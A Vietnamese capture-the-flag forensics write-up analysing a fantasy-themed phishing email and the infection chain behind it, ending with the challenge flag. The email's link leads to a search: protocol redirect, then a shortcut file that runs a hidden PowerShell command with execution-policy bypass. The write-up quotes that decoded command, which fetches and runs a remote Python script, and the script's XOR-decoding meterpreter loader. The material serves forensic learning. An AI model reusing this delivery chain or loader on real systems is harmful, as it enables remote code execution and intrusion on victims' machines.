---
title: a new hire

---

# a new hire - fake-cv - pdf - malware

## Description

The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

----

> written by 9r3y 

## Thought process
Khi unzip file đề bài cho, ta được:
```bash
$ unzip forensics_a_new_hire.zip 
Archive:  forensics_a_new_hire.zip
  inflating: email.eml  
```
Trước tiên nên xem thử đây có đúng là file .eml không:
```bash
$ file email.eml 
email.eml: SMTP mail, Unicode text, UTF-8 text
```
Có vẻ đúng, tiếp đến nội dung bên trong:
```bash
$ cat email.eml 
Return-Path: <elowan81@eldor.ia>
Received: from mail-sor-f41.eldor.ia (mail-sor-f41.eldor.ia [209.85.220.41])
    by mx.eldor.ia (Postfix) with ESMTPS id A1B2C3D4E5F6
    for <work@eldor.ia>; Mon, 01 Jan 2024 12:34:56 -0700 (PDT)
    (version=TLS1.3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256)
Received: from [192.168.1.100] (customer-pool-192-168-1-100.eldor.ia [192.168.1.100])
    by mail-sor-f41.eldor.ia with ESMTPSA id F6E5D4C3B2A1
    for <work@eldor.ia>; Mon, 01 Jan 2024 12:34:55 -0700 (PDT)
    (version=TLS1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128)
Authentication-Results: mx.eldor.ia;
    dkim=pass header.d=eldor.ia header.s=default header.b="3nw7H9qL1vXf5T8sK2zY6pB4rQ0eC7uM";
    spf=pass (mx.eldor.ia: domain of elowan81@eldor.ia designates 209.85.220.41 as permitted sender) smtp.mailfrom=elowan81@eldor.ia;
    dmarc=pass (p=quarantine sp=reject) header.from=eldor.ia
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
    d=eldor.ia; s=default; t=1704123295;
    h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
    bh=Qm6qK81lr9XH/FGV5tS2kD3pW4aI7m2xZv9d1kE6cT8y=;
    b=V8pPz1n+R2tW4yZ6aB8cD0eF2gH4iJ6kL8mN0oP2qR4sT6uV8wX0yZ2aB4cD6eF8
     gH0iJ2kL4mN6oP8qR0sT2uV4wX6yZ8aB0cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4;
Received-SPF: pass (mx.eldor.ia: domain of elowan81@eldor.ia designates 209.85.220.41 as permitted sender) client-ip=209.85.220.41;
ARC-Authentication-Results: i=1; mx.eldor.ia;
    dkim=pass header.d=eldor.ia header.s=default header.b="3nw7H9qL1vXf5T8sK2zY6pB4rQ0eC7uM";
    spf=pass smtp.mailfrom=elowan81@eldor.ia;
    dmarc=pass (p=quarantine sp=reject) header.from=eldor.ia
ARC-Seal: i=1; a=rsa-sha256; t=1704123295; cv=none;
    d=eldor.ia; s=arc20240101;
    b=n8U2w3v1y7Z4x6T9r5q0p3o1l7m6k2j8i4h1g3f5d7s9a0b2c4e6r8t0y5u3w1x2
     a9b7c5d3e1f0g2h4i6j8k0l2m4n6o8p0q2r4s6t8u0v2w4x6y8z0A2B4C6D8E0F2G4;
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
    d=eldor.ia; s=arc20240101;
    h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
    bh=Qm6qK81lr9XH/FGV5tS2kD3pW4aI7m2xZv9d1kE6cT8y=;
    b=k4n5o6p7q8r9s0t1u2v3w4x5y6z7A8B9C0D1E2F3G4H5I6J7K8L9M0N1O2P3Q4R5
     S6T7U8V9W0X1Y2Z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8;
Message-ID: <20240101123456.1234567890@mail-sor-f41.eldor.ia>
From: "Elowan" <elowan81@eldor.ia>
To: "Work" <work@eldor.ia>
Subject: Job Application - Resume Review 
Date: Mon, 01 Jan 2024 12:34:56 -0700
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

Hello Work Team,

I hope this email finds you well. We have received a new application for the open position, and we wanted to bring it to your attention.

The applicant, Lord Malakar, has an extensive background in 

... //social engineering content

You can review his resume here:
`storage.microsoftcloudservices.com:[PORT]/index.php`

Please let us know if you would like to proceed with the next steps in the hiring process.

Best regards,
Elowan

PS: Make sure you replace the '[PORT]' with your instance's port. Additionally, make sure that any hostnames that are found point to your instance's IP address!
```
Đây là một phishing email prompt nạn nhân truy cập vào `storage.microsoftcloudservices.com:[PORT]/index.php` - trong đó "storage.microsoftcloudservices.com" thực chất là một địa chỉ mạo danh microsoft.

Khi dùng IP address & port cung cấp bởi challenge để truy cập vào ``[PORT]/index.php`` trong email, ta được đưa đến 1 trang web mà khi inspect javascript của web, tiếp tục nhận được 1 địa chỉ mới: 

```bash
$ curl 94.237.52.195:57937/index.php
Setup data recorded.
<!DOCTYPE html>
<html>
<head>
  <style>
    body, html {
...
    function getResume() { 
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
  </script>
</body>
</html>
```
Khi mở [PORT]/index.php trên browser, một trang web như này sẽ hiển thị: 
![](http://note.bksec.vn/pad/uploads/d1386a0b-1a7c-404d-9380-f1cf2a8b4ce3.png)
Nút "View Full Resume" có chứa function `getResume()` mà nội dung thực chất là:
* Sử dụng cửa sổ `window.location.href` của browser để redirect đến URL `search:displayname=Downloads&subquery=\\storage.microsoftcloudservices.com@PORT\3fe1690d955e8fd2a0b282501570e1f4\resumes\` 
* protocol `search:` sẽ launch [Microsoft's Search Protocol](https://learn.microsoft.com/en-us/windows/win32/shell/search-protocol) và prompt nạn nhân chấp nhận mở Windows Explorer -> folder "Downloads" và hiển thị các file trong folder "storage.microsoftcloudservices.com@PORT\3fe1690d955e8fd2a0b282501570e1f4\resumes\":
![](http://note.bksec.vn/pad/uploads/2d7b7e06-2869-45c3-bf46-d82d6f085a63.png)

Trong folder này chứa file `Resume.pdf.lnk`. Inspect hex của file này:
```bash
$ xxd 'Resume.pdf .lnk.download' 
...
00000160: 0000 0014 0043 3a5c 5769 6e64 6f77 735c  .....C:\Windows\
00000170: 5379 7374 656d 3332 5cdb 032f 6320 706f  System32\../c po
00000180: 7765 7273 6865 6c6c 2e65 7865 202d 5720  wershell.exe -W 
00000190: 4869 6464 656e 202d 6e6f 7020 2d65 7020  Hidden -nop -ep 
000001a0: 6279 7061 7373 202d 4e6f 4578 6974 202d  bypass -NoExit -
000001b0: 4520 5777 4254 4148 6b41 6377 4230 4147  E WwBTAHkAcwB0AG
...
000001c0: 5541 6251 4175 4145 5141 6151 4268               AAeQA=....
```
Có chứa một PowerShell command với những flag đáng ngờ:
* -W Hidden (-WindowStyle Hidden): chạy PowerShell trong một cửa sổ ẩn
* -ep bypass (-ExecutionPolicy Bypass)
* -NoExit: giữ PowerShell session này hoạt động
* -E (-EncodedCommand)
-> File pdf shorcut này có chứa một PowerShell command bao gồm mã hóa base64.
Sau khi decode đoạn mã hóa:
```powershell
[System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:12345/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf')
\\storage.microsoftcloudservices.com@12345\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@12345\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
```
Command này thực hiện:
Trong folder share: 
* Mở file `resume_official.pdf` bằng Microsoft Edge
* chạy `client.py` bằng Python version storage.microsoftcloudservices.com@12345\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe -> nếu nạn nhân không tải Python trên máy mình thì script "client.py" vẫn đảm bảo được chạy.

Inspect nội dung trong `client.py`: 
```python
import base64
key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")
data = base64.b64decode("c97FeXRj6jeG...(redacted)")
meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
exec(__import__('zlib').decompress(meterpreter_data)[0])
```
Sau khi decode đoạn key, ta được flag:
`HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}`